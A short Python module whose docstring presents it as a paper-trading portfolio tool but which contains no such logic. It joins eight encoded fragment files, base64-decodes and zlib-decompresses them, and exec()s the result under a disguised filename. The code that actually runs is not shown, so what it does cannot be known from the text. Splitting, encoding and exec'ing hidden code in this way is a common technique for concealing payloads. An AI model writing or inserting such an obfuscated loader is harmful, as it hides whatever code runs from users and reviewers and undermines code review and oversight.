"""Instant Paper Portfolio — no scale-in default, cooldown, sha256 order_id."""
from __future__ import annotations
import base64, zlib
from pathlib import Path
_d = Path(__file__).resolve().parent
_blob = "".join((_d / f"paper_portfolio.blob.a{i}").read_text().strip() for i in range(4))
_blob += "".join((_d / f"paper_portfolio.blob.b{i}").read_text().strip() for i in range(4))
exec(compile(zlib.decompress(base64.b64decode(_blob)), "paper_portfolio.py", "exec"), globals())
